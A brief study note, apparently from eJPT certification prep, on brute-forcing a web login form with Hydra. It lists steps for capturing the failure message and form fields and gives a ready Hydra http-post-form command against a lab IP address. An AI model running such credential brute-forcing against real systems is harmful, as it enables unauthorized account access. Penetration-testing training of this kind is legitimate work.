# Brute Forcing HTTP logins with Hydra
1. enter fake login information info the login form
2. copy the error message that is received
3. Go to the page source and check into the data below


![image](https://github.com/Nater-aide/EJPT/assets/143526926/b31c7b17-42ea-4bab-a810-8148c620e393)

This image would be this command: ```hydra -L usernames -P passwords 
192.208.137.3
 http-post-form"/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid
credentials or user not activated!"```

https://assets.ine.com/labs/ad-manuals/walkthrough-1895.pdf
